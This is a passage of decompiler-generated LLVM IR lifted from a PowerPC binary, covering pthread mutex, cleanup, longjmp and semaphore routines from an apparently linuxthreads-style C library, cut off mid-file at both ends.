  store i32 ptrtoint (i32* @global_var_10016c00.1087 to i32), i32* @lr, align 4
  %v1_10016bfc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496ec.1078 to i32))
  store i32 0, i32* %arg1, align 4
  %v0_10016c08 = load i32, i32* @r29, align 4
  store i32 %v0_10016c08, i32* @r3, align 4
  store i32 268528656, i32* @lr, align 4
  %v0_10016c0c = call i32 @pthread_mutex_unlock()
  store i32 268528668, i32* @lr, align 4
  %v1_10016c18 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_10049704.1079 to i32))
  ret i32 %v1_10016c18

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_10049704.1079, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10049704.1079 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), { 3, 7, 8, 2, 1, 0, 4, 5, 9, 6 }
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10016c44 = add i32 %arg1, 12
  %v2_10016c44 = inttoptr i32 %v1_10016c44 to i32*
  %v3_10016c44 = load i32, i32* %v2_10016c44, align 4
  %v3_10016c48 = icmp eq i32 %v3_10016c44, 1
  br i1 %v3_10016c48, label %dec_label_pc_10016c90, label %dec_label_pc_10016c50

dec_label_pc_10016c50:                            ; preds = %entry
  %v2_10016c48 = icmp sgt i32 %v3_10016c44, 1
  br i1 %v2_10016c48, label %dec_label_pc_10016c60, label %dec_label_pc_10016c54

dec_label_pc_10016c54:                            ; preds = %dec_label_pc_10016c50
  %v3_10016c54 = icmp eq i32 %v3_10016c44, 0
  br i1 %v3_10016c54, label %dec_label_pc_10016c78, label %dec_label_pc_10016c70

dec_label_pc_10016c60:                            ; preds = %dec_label_pc_10016c50
  %v3_10016c60 = icmp eq i32 %v3_10016c44, 2
  br i1 %v3_10016c60, label %dec_label_pc_10016cd0, label %dec_label_pc_10016c68

dec_label_pc_10016c68:                            ; preds = %dec_label_pc_10016c60
  %v3_10016c68 = icmp eq i32 %v3_10016c44, 3
  br i1 %v3_10016c68, label %dec_label_pc_10016ce8, label %dec_label_pc_10016c70

dec_label_pc_10016c70:                            ; preds = %dec_label_pc_10016c54, %dec_label_pc_10016c68
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016d00

dec_label_pc_10016c78:                            ; preds = %dec_label_pc_10016c54
  %v1_10016c7c = add i32 %arg1, 16
  store i32 %v1_10016c7c, i32* %r3.global-to-local, align 4
  %v1_10016c8c = inttoptr i32 %v1_10016c7c to i32*
  %v2_10016c8c = call i32 @__pthread_trylock(i32* %v1_10016c8c)
  store i32 %v2_10016c8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016c90

dec_label_pc_10016c90:                            ; preds = %entry, %dec_label_pc_10016c78
  %v0_10016ca0 = phi i32 [ %arg1, %entry ], [ %v2_10016c8c, %dec_label_pc_10016c78 ]
  %v1_10016c90 = add i32 %v0_10016ca0, 8
  %v2_10016c90 = inttoptr i32 %v1_10016c90 to i32*
  %v3_10016c90 = load i32, i32* %v2_10016c90, align 4
  %v0_10016c94 = load i32, i32* @r2, align 4
  store i32 %v0_10016c94, i32* @r30, align 4
  %v4_10016c98 = icmp eq i32 %v3_10016c90, %v0_10016c94
  br i1 %v4_10016c98, label %dec_label_pc_10016ca0, label %dec_label_pc_10016cb4

dec_label_pc_10016ca0:                            ; preds = %dec_label_pc_10016c90
  %v1_10016ca0 = add i32 %v0_10016ca0, 4
  %v2_10016ca0 = inttoptr i32 %v1_10016ca0 to i32*
  %v3_10016ca0 = load i32, i32* %v2_10016ca0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016ca8 = add i32 %v3_10016ca0, 1
  %v1_10016cac = load i32, i32* @r31, align 4
  %v2_10016cac = add i32 %v1_10016cac, 4
  %v3_10016cac = inttoptr i32 %v2_10016cac to i32*
  store i32 %v1_10016ca8, i32* %v3_10016cac, align 4
  br label %dec_label_pc_10016d00

dec_label_pc_10016cb4:                            ; preds = %dec_label_pc_10016c90
  %v1_10016cb4 = add i32 %v0_10016ca0, 16
  store i32 %v1_10016cb4, i32* %r3.global-to-local, align 4
  %v1_10016cb8 = inttoptr i32 %v1_10016cb4 to i32*
  %v2_10016cb8 = call i32 @__pthread_trylock(i32* %v1_10016cb8)
  store i32 %v2_10016cb8, i32* %r3.global-to-local, align 4
  %v3_10016cbc = icmp eq i32 %v2_10016cb8, 0
  br i1 %v3_10016cbc, label %dec_label_pc_10016cc4, label %dec_label_pc_10016d00

dec_label_pc_10016cc4:                            ; preds = %dec_label_pc_10016cb4
  %v0_10016cc4 = load i32, i32* @r30, align 4
  %v1_10016cc4 = load i32, i32* @r31, align 4
  %v2_10016cc4 = add i32 %v1_10016cc4, 8
  %v3_10016cc4 = inttoptr i32 %v2_10016cc4 to i32*
  store i32 %v0_10016cc4, i32* %v3_10016cc4, align 4
  %v0_10016cc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10016cc8 = load i32, i32* @r31, align 4
  %v2_10016cc8 = add i32 %v1_10016cc8, 4
  %v3_10016cc8 = inttoptr i32 %v2_10016cc8 to i32*
  store i32 %v0_10016cc8, i32* %v3_10016cc8, align 4
  br label %dec_label_pc_10016d00

dec_label_pc_10016cd0:                            ; preds = %dec_label_pc_10016c60
  %v1_10016cd0 = add i32 %arg1, 16
  store i32 %v1_10016cd0, i32* %r3.global-to-local, align 4
  %v1_10016cd4 = inttoptr i32 %v1_10016cd0 to i32*
  %v2_10016cd4 = call i32 @__pthread_alt_trylock(i32* %v1_10016cd4)
  store i32 %v2_10016cd4, i32* %r3.global-to-local, align 4
  %v3_10016cd8 = icmp eq i32 %v2_10016cd4, 0
  br i1 %v3_10016cd8, label %dec_label_pc_10016ce0, label %dec_label_pc_10016d00

dec_label_pc_10016ce0:                            ; preds = %dec_label_pc_10016cd0
  %v0_10016ce0 = load i32, i32* @r2, align 4
  %v1_10016ce0 = load i32, i32* @r31, align 4
  %v2_10016ce0 = add i32 %v1_10016ce0, 8
  %v3_10016ce0 = inttoptr i32 %v2_10016ce0 to i32*
  store i32 %v0_10016ce0, i32* %v3_10016ce0, align 4
  br label %dec_label_pc_10016d00

dec_label_pc_10016ce8:                            ; preds = %dec_label_pc_10016c68
  %v1_10016cec = add i32 %arg1, 16
  store i32 %v1_10016cec, i32* %r3.global-to-local, align 4
  %v1_10016cfc = inttoptr i32 %v1_10016cec to i32*
  %v2_10016cfc = call i32 @__pthread_alt_trylock(i32* %v1_10016cfc)
  store i32 %v2_10016cfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016d00

dec_label_pc_10016d00:                            ; preds = %dec_label_pc_10016cd0, %dec_label_pc_10016cb4, %dec_label_pc_10016ce0, %dec_label_pc_10016cc4, %dec_label_pc_10016ca0, %dec_label_pc_10016c70, %dec_label_pc_10016ce8
  %v0_10016d10 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016d10

; uselistorder directives
  uselistorder i32 %v0_10016ca0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 11, 1, 2, 9, 3, 10, 12, 5, 4, 6, 7, 8, 0 }
  uselistorder i32 (i32*)* @__pthread_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 3, 4, 5, 2, 1, 0, 6 }
  uselistorder label %dec_label_pc_10016d00, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10016c90, { 1, 0 }
  uselistorder label %dec_label_pc_10016c70, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10016d30 = add i32 %arg2, 4
  %v2_10016d30 = inttoptr i32 %v1_10016d30 to i32*
  %v3_10016d30 = load i32, i32* %v2_10016d30, align 4
  %v3_10016d34 = icmp ugt i32 %v3_10016d30, 999999999
  br i1 %v3_10016d34, label %dec_label_pc_10016e18, label %dec_label_pc_10016d3c

dec_label_pc_10016d3c:                            ; preds = %entry
  %v1_10016d3c = add i32 %arg1, 12
  %v2_10016d3c = inttoptr i32 %v1_10016d3c to i32*
  %v3_10016d3c = load i32, i32* %v2_10016d3c, align 4
  %v3_10016d40 = icmp eq i32 %v3_10016d3c, 1
  br i1 %v3_10016d40, label %dec_label_pc_10016d80, label %dec_label_pc_10016d48

dec_label_pc_10016d48:                            ; preds = %dec_label_pc_10016d3c
  %v2_10016d40 = icmp sgt i32 %v3_10016d3c, 1
  br i1 %v2_10016d40, label %dec_label_pc_10016d58, label %dec_label_pc_10016d4c

dec_label_pc_10016d4c:                            ; preds = %dec_label_pc_10016d48
  %v3_10016d4c = icmp eq i32 %v3_10016d3c, 0
  br i1 %v3_10016d4c, label %dec_label_pc_10016d6c, label %dec_label_pc_10016e18

dec_label_pc_10016d58:                            ; preds = %dec_label_pc_10016d48
  %v3_10016d58 = icmp eq i32 %v3_10016d3c, 2
  br i1 %v3_10016d58, label %dec_label_pc_10016dc0, label %dec_label_pc_10016d60

dec_label_pc_10016d60:                            ; preds = %dec_label_pc_10016d58
  %v3_10016d60 = icmp eq i32 %v3_10016d3c, 3
  br i1 %v3_10016d60, label %dec_label_pc_10016df8, label %dec_label_pc_10016e18

dec_label_pc_10016d6c:                            ; preds = %dec_label_pc_10016d4c
  %v1_10016d6c = add i32 %arg1, 16
  store i32 %v1_10016d6c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016d78.1088 to i32), i32* @lr, align 4
  %v0_10016d74 = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016e24

dec_label_pc_10016d80:                            ; preds = %dec_label_pc_10016d3c
  %v1_10016d80 = add i32 %arg1, 8
  %v2_10016d80 = inttoptr i32 %v1_10016d80 to i32*
  %v3_10016d80 = load i32, i32* %v2_10016d80, align 4
  %v0_10016d84 = load i32, i32* @r2, align 4
  %v4_10016d88 = icmp eq i32 %v3_10016d80, %v0_10016d84
  br i1 %v4_10016d88, label %dec_label_pc_10016d90, label %dec_label_pc_10016da4

dec_label_pc_10016d90:                            ; preds = %dec_label_pc_10016d80
  %v1_10016d90 = add i32 %arg1, 4
  %v2_10016d90 = inttoptr i32 %v1_10016d90 to i32*
  %v3_10016d90 = load i32, i32* %v2_10016d90, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016d98 = add i32 %v3_10016d90, 1
  store i32 %v1_10016d98, i32* %v2_10016d90, align 4
  br label %dec_label_pc_10016e24

dec_label_pc_10016da4:                            ; preds = %dec_label_pc_10016d80
  %v1_10016da4 = add i32 %arg1, 16
  store i32 %v1_10016da4, i32* @r3, align 4
  store i32 %v0_10016d84, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10016db0.1089 to i32), i32* @lr, align 4
  %v0_10016dac = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016db8 = load i32, i32* @r31, align 4
  %v2_10016db8 = add i32 %v1_10016db8, 4
  %v3_10016db8 = inttoptr i32 %v2_10016db8 to i32*
  store i32 0, i32* %v3_10016db8, align 4
  br label %dec_label_pc_10016df0

dec_label_pc_10016dc0:                            ; preds = %dec_label_pc_10016d58
  %v1_10016dc0 = add i32 %arg1, 8
  %v2_10016dc0 = inttoptr i32 %v1_10016dc0 to i32*
  %v3_10016dc0 = load i32, i32* %v2_10016dc0, align 4
  %v0_10016dc4 = load i32, i32* @r2, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_10016dcc = icmp eq i32 %v3_10016dc0, %v0_10016dc4
  br i1 %v4_10016dcc, label %dec_label_pc_10016e24, label %dec_label_pc_10016dd4

dec_label_pc_10016dd4:                            ; preds = %dec_label_pc_10016dc0
  %v1_10016dd8 = add i32 %arg1, 16
  store i32 %v1_10016dd8, i32* %r3.global-to-local, align 4
  store i32 268529124, i32* @lr, align 4
  %v4_10016de0 = inttoptr i32 %v1_10016dd8 to i32*
  %v5_10016de0 = call i32 @__pthread_alt_timedlock(i32* %v4_10016de0, i32 %v0_10016dc4, i32 %arg2, i32 999999999)
  store i32 %v5_10016de0, i32* %r3.global-to-local, align 4
  %v3_10016de4 = icmp eq i32 %v5_10016de0, 0
  br i1 %v3_10016de4, label %dec_label_pc_10016e20, label %dec_label_pc_10016dec

dec_label_pc_10016dec:                            ; preds = %dec_label_pc_10016dd4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016df0

dec_label_pc_10016df0:                            ; preds = %dec_label_pc_10016da4, %dec_label_pc_10016dec
  %v0_10016df0 = load i32, i32* @r30, align 4
  %v1_10016df0 = load i32, i32* @r31, align 4
  %v2_10016df0 = add i32 %v1_10016df0, 8
  %v3_10016df0 = inttoptr i32 %v2_10016df0 to i32*
  store i32 %v0_10016df0, i32* %v3_10016df0, align 4
  br label %dec_label_pc_10016e24

dec_label_pc_10016df8:                            ; preds = %dec_label_pc_10016d60
  %v1_10016dfc = add i32 %arg1, 16
  store i32 %v1_10016dfc, i32* %r3.global-to-local, align 4
  store i32 268529160, i32* @lr, align 4
  %v4_10016e04 = inttoptr i32 %v1_10016dfc to i32*
  %v5_10016e04 = call i32 @__pthread_alt_timedlock(i32* %v4_10016e04, i32 0, i32 %arg2, i32 999999999)
  %v3_10016e08 = icmp eq i32 %v5_10016e04, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10016e08, label %dec_label_pc_10016e20, label %dec_label_pc_10016e24

dec_label_pc_10016e18:                            ; preds = %dec_label_pc_10016d4c, %dec_label_pc_10016d60, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016e24

dec_label_pc_10016e20:                            ; preds = %dec_label_pc_10016df8, %dec_label_pc_10016dd4
  store i32 110, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016e24

dec_label_pc_10016e24:                            ; preds = %dec_label_pc_10016df8, %dec_label_pc_10016dc0, %dec_label_pc_10016e18, %dec_label_pc_10016df0, %dec_label_pc_10016d90, %dec_label_pc_10016d6c, %dec_label_pc_10016e20
  %v0_10016e34 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016e34

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i32 999999999, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 0, 1, 6, 5, 2, 7, 3, 8 }
  uselistorder label %dec_label_pc_10016e24, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10016e18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10016df0, { 1, 0 }
}

define i32 @pthread_cleanup_upto() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10016e3c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10016e3c, i32* %stack_var_-32, align 4
  %v5_10016e3c = ptrtoint i32* %stack_var_-32 to i32
  %v0_10016e44 = load i32, i32* @r2, align 4
  store i32 %v0_10016e44, i32* %r30.global-to-local, align 4
  %v0_10016e4c = load i32, i32* @r3, align 4
  store i32 %v0_10016e4c, i32* @r28, align 4
  store i32 %v5_10016e3c, i32* @r29, align 4
  %v1_10016e54 = add i32 %v0_10016e44, 60
  %storemerge.in11 = inttoptr i32 %v1_10016e54 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r31.global-to-local, align 4
  %v3_10016e7c15 = icmp eq i32 %storemerge12, 0
  %v3_10016e8017 = icmp ugt i32 %storemerge12, %v5_10016e3c
  br i1 %v3_10016e7c15, label %dec_label_pc_10016e94, label %dec_label_pc_10016e88

dec_label_pc_10016e5c:                            ; preds = %dec_label_pc_10016e88
  br i1 %v3_10016e8021, label %dec_label_pc_10016e68, label %dec_label_pc_10016e60

dec_label_pc_10016e60:                            ; preds = %dec_label_pc_10016e5c
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10016e94

dec_label_pc_10016e68:                            ; preds = %dec_label_pc_10016e5c
  %v1_10016e68 = inttoptr i32 %storemerge20 to i32*
  %v2_10016e68 = load i32, i32* %v1_10016e68, align 4
  %v1_10016e6c = add i32 %storemerge20, 4
  %v2_10016e6c = inttoptr i32 %v1_10016e6c to i32*
  %v3_10016e6c = load i32, i32* %v2_10016e6c, align 4
  call void @__pseudo_call(i32 %v2_10016e68)
  %v0_10016e78 = load i32, i32* %r31.global-to-local, align 4
  %v1_10016e78 = add i32 %v0_10016e78, 12
  %v1_10016e80.pre = load i32, i32* @r29, align 4
  %storemerge.in = inttoptr i32 %v1_10016e78 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10016e7c = icmp eq i32 %storemerge, 0
  br i1 %v3_10016e7c, label %dec_label_pc_10016e94, label %dec_label_pc_10016e68.dec_label_pc_10016e88_crit_edge

dec_label_pc_10016e68.dec_label_pc_10016e88_crit_edge: ; preds = %dec_label_pc_10016e68
  %v3_10016e80 = icmp ugt i32 %storemerge, %v1_10016e80.pre
  %v0_10016e88.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10016e88

dec_label_pc_10016e88:                            ; preds = %entry, %dec_label_pc_10016e68.dec_label_pc_10016e88_crit_edge
  %v0_10016e88 = phi i32 [ %v0_10016e88.pre, %dec_label_pc_10016e68.dec_label_pc_10016e88_crit_edge ], [ %v0_10016e4c, %entry ]
  %v3_10016e8021 = phi i1 [ %v3_10016e80, %dec_label_pc_10016e68.dec_label_pc_10016e88_crit_edge ], [ %v3_10016e8017, %entry ]
  %storemerge20 = phi i32 [ %storemerge, %dec_label_pc_10016e68.dec_label_pc_10016e88_crit_edge ], [ %storemerge12, %entry ]
  %.019 = phi i32 [ %v3_10016e6c, %dec_label_pc_10016e68.dec_label_pc_10016e88_crit_edge ], [ undef, %entry ]
  %v1_10016e88 = inttoptr i32 %v0_10016e88 to i32*
  %v2_10016e88 = load i32, i32* %v1_10016e88, align 4
  %v2_10016e8c = icmp ult i32 %storemerge20, %v2_10016e88
  br i1 %v2_10016e8c, label %dec_label_pc_10016e5c, label %dec_label_pc_10016e94

dec_label_pc_10016e94:                            ; preds = %entry, %dec_label_pc_10016e68, %dec_label_pc_10016e88, %dec_label_pc_10016e60
  %.010 = phi i32 [ %.019, %dec_label_pc_10016e60 ], [ undef, %entry ], [ %v3_10016e6c, %dec_label_pc_10016e68 ], [ %.019, %dec_label_pc_10016e88 ]
  %v0_10016e98 = phi i32 [ 0, %dec_label_pc_10016e60 ], [ 0, %entry ], [ 0, %dec_label_pc_10016e68 ], [ %storemerge20, %dec_label_pc_10016e88 ]
  %v0_10016e94 = load i32, i32* %r30.global-to-local, align 4
  %v1_10016e94 = add i32 %v0_10016e94, 84
  %v2_10016e94 = inttoptr i32 %v1_10016e94 to i32*
  %v3_10016e94 = load i32, i32* %v2_10016e94, align 4
  store i32 %v3_10016e94, i32* %r9.global-to-local, align 4
  %v2_10016e98 = add i32 %v0_10016e94, 60
  %v3_10016e98 = inttoptr i32 %v2_10016e98 to i32*
  store i32 %v0_10016e98, i32* %v3_10016e98, align 4
  %v0_10016e9c = load i32, i32* %r9.global-to-local, align 4
  %v3_10016e9c = icmp eq i32 %v0_10016e9c, 0
  br i1 %v3_10016e9c, label %dec_label_pc_10016eb8, label %dec_label_pc_10016ea4

dec_label_pc_10016ea4:                            ; preds = %dec_label_pc_10016e94
  %v0_10016ea4 = load i32, i32* @r28, align 4
  %v1_10016ea4 = inttoptr i32 %v0_10016ea4 to i32*
  %v2_10016ea4 = load i32, i32* %v1_10016ea4, align 4
  %v2_10016ea8 = icmp ult i32 %v0_10016e9c, %v2_10016ea4
  br i1 %v2_10016ea8, label %dec_label_pc_10016eb0, label %dec_label_pc_10016eb8

dec_label_pc_10016eb0:                            ; preds = %dec_label_pc_10016ea4
  %v1_10016eb4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10016eb4 = add i32 %v1_10016eb4, 84
  %v3_10016eb4 = inttoptr i32 %v2_10016eb4 to i32*
  store i32 0, i32* %v3_10016eb4, align 4
  br label %dec_label_pc_10016eb8

dec_label_pc_10016eb8:                            ; preds = %dec_label_pc_10016ea4, %dec_label_pc_10016e94, %dec_label_pc_10016eb0
  ret i32 %.010

; uselistorder directives
  uselistorder i32 %storemerge20, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10016eb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10016e94, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_10016e88, { 1, 0 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268529384, i32* @lr, align 4
  %v0_10016ee4 = call i32 @pthread_cleanup_upto()
  %v0_10016ee8 = load i32, i32* @r29, align 4
  %v0_10016eec = load i32, i32* @r28, align 4
  store i32 268529396, i32* @lr, align 4
  %v2_10016ef0 = call i32 @_longjmp(i32 %v0_10016ee8, i32 %v0_10016eec)
  ret i32 %v2_10016ef0
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268529424, i32* @lr, align 4
  %v0_10016f0c = call i32 @pthread_cleanup_upto()
  %v0_10016f10 = load i32, i32* @r29, align 4
  %v0_10016f14 = load i32, i32* @r28, align 4
  store i32 268529436, i32* @lr, align 4
  %v2_10016f18 = call i32 @_longjmp(i32 %v0_10016f10, i32 %v0_10016f14)
  ret i32 %v2_10016f18

; uselistorder directives
  uselistorder i32 (i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 ()* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @enqueue.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder void ()* @llvm.trap, { 1, 2, 0, 3 }
}

define i32 @remove_from_queue.6(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10016f74.pre = load i32, i32* @r3, align 4
  %v1_10016f7421 = inttoptr i32 %v0_10016f74.pre to i32*
  %v2_10016f7422 = load i32, i32* %v1_10016f7421, align 4
  store i32 %v2_10016f7422, i32* %r9.global-to-local, align 4
  %v3_10016f7825 = icmp eq i32 %v2_10016f7422, 0
  br i1 %v3_10016f7825, label %dec_label_pc_10016f84, label %dec_label_pc_10016f54

dec_label_pc_10016f54:                            ; preds = %entry, %dec_label_pc_10016f70
  %v2_10016f74.pn = phi i32 [ %v2_10016f74, %dec_label_pc_10016f70 ], [ %v2_10016f7422, %entry ]
  %v2_10016f7430 = phi i32 [ %v2_10016f74, %dec_label_pc_10016f70 ], [ %v2_10016f7422, %entry ]
  %v1_10016f7429 = phi i32* [ %v1_10016f74, %dec_label_pc_10016f70 ], [ %v1_10016f7421, %entry ]
  %v4_10016f7c35 = icmp eq i32 %v2_10016f74.pn, %arg1
  %v1_10016f58 = add i32 %v2_10016f7430, 8
  br i1 %v4_10016f7c35, label %dec_label_pc_10016f58, label %dec_label_pc_10016f70

dec_label_pc_10016f58:                            ; preds = %dec_label_pc_10016f54
  %v2_10016f58 = inttoptr i32 %v1_10016f58 to i32*
  %v3_10016f58 = load i32, i32* %v2_10016f58, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_10016f58, i32* %v1_10016f7429, align 4
  %v1_10016f68 = load i32, i32* %r9.global-to-local, align 4
  %v2_10016f68 = add i32 %v1_10016f68, 8
  %v3_10016f68 = inttoptr i32 %v2_10016f68 to i32*
  store i32 0, i32* %v3_10016f68, align 4
  %v0_10016f88.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10016f88

dec_label_pc_10016f70:                            ; preds = %dec_label_pc_10016f54
  %v1_10016f74 = inttoptr i32 %v1_10016f58 to i32*
  %v2_10016f74 = load i32, i32* %v1_10016f74, align 4
  store i32 %v2_10016f74, i32* %r9.global-to-local, align 4
  %v3_10016f78 = icmp eq i32 %v2_10016f74, 0
  br i1 %v3_10016f78, label %dec_label_pc_10016f84, label %dec_label_pc_10016f54

dec_label_pc_10016f84:                            ; preds = %dec_label_pc_10016f70, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10016f88

dec_label_pc_10016f88:                            ; preds = %dec_label_pc_10016f58, %dec_label_pc_10016f84
  %v0_10016f88 = phi i32 [ %v0_10016f88.pre, %dec_label_pc_10016f58 ], [ 0, %dec_label_pc_10016f84 ]
  ret i32 %v0_10016f88

; uselistorder directives
  uselistorder i32 %v2_10016f74, { 2, 3, 0, 1 }
  uselistorder i32* %v1_10016f74, { 1, 0 }
  uselistorder i32 %v1_10016f58, { 1, 0 }
  uselistorder i32 %v2_10016f7422, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10016f88, { 1, 0 }
  uselistorder label %dec_label_pc_10016f54, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10016f90 = add i32 %arg1, 8
  %v2_10016f90 = inttoptr i32 %v1_10016f90 to i32*
  %v3_10016f90 = load i32, i32* %v2_10016f90, align 4
  store i32 %v3_10016f90, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if.7(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10016fa0 = call i32 @__asm_mfcr()
  store i32 %v0_10016fa0, i32* %r3.global-to-local, align 4
  %v3_10016fa4 = icmp eq i32 %arg2, 0
  store i1 %v3_10016fa4, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10016fa0, i32* @r31, align 4
  store i32 %v0_10016fa0, i32* @r4, align 4
  br i1 %v3_10016fa4, label %dec_label_pc_10016fe4, label %dec_label_pc_10016fcc

dec_label_pc_10016fcc:                            ; preds = %entry
  %v1_10016fcc = add i32 %v0_10016fa0, 64
  %v2_10016fcc = inttoptr i32 %v1_10016fcc to i8*
  %v3_10016fcc = load i8, i8* %v2_10016fcc, align 1
  %v3_10016fd0 = icmp eq i8 %v3_10016fcc, 0
  br i1 %v3_10016fd0, label %dec_label_pc_10016fe4.thread, label %dec_label_pc_10016ff4

dec_label_pc_10016fe4.thread:                     ; preds = %dec_label_pc_10016fcc
  %v2_10016fe44 = add i32 %v0_10016fa0, 444
  %v3_10016fe45 = inttoptr i32 %v2_10016fe44 to i32*
  store i32 %arg2, i32* %v3_10016fe45, align 4
  br label %dec_label_pc_10016ff4

dec_label_pc_10016fe4:                            ; preds = %entry
  %v1_10016fdc = add i32 %v0_10016fa0, 28
  %v2_10016fdc = inttoptr i32 %v1_10016fdc to i32*
  %v3_10016fdc = load i32, i32* %v2_10016fdc, align 4
  store i32 %v3_10016fdc, i32* @r3, align 4
  store i32 268529636, i32* @lr, align 4
  %v0_10016fe0 = call i32 @__pthread_lock()
  store i32 %v0_10016fe0, i32* %r3.global-to-local, align 4
  %v0_10016fe4.pre = load i32, i32* @r30, align 4
  %v1_10016fe4.pre = load i32, i32* @r31, align 4
  %v0_10016fe8.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10016fe4 = add i32 %v1_10016fe4.pre, 444
  %v3_10016fe4 = inttoptr i32 %v2_10016fe4 to i32*
  store i32 %v0_10016fe4.pre, i32* %v3_10016fe4, align 4
  br i1 %v0_10016fe8.pre, label %dec_label_pc_10016fec, label %dec_label_pc_10016ff4

dec_label_pc_10016fec:                            ; preds = %dec_label_pc_10016fe4
  %v0_10016fec = load i32, i32* @r31, align 4
  %v1_10016fec = add i32 %v0_10016fec, 28
  %v2_10016fec = inttoptr i32 %v1_10016fec to i32*
  %v3_10016fec = load i32, i32* %v2_10016fec, align 4
  store i32 %v3_10016fec, i32* @r3, align 4
  store i32 268529652, i32* @lr, align 4
  %v0_10016ff0 = call i32 @__pthread_unlock()
  store i32 %v0_10016ff0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016ff4

dec_label_pc_10016ff4:                            ; preds = %dec_label_pc_10016fe4.thread, %dec_label_pc_10016fe4, %dec_label_pc_10016fcc, %dec_label_pc_10016fec
  %v1_10017004 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10016fa0)
  %v0_1001700c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001700c

; uselistorder directives
  uselistorder i32 %v0_10016fa0, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 1, 0 }
  uselistorder i32 444, { 3, 0, 6, 1, 5, 2, 4 }
  uselistorder label %dec_label_pc_10016ff4, { 3, 1, 0, 2 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
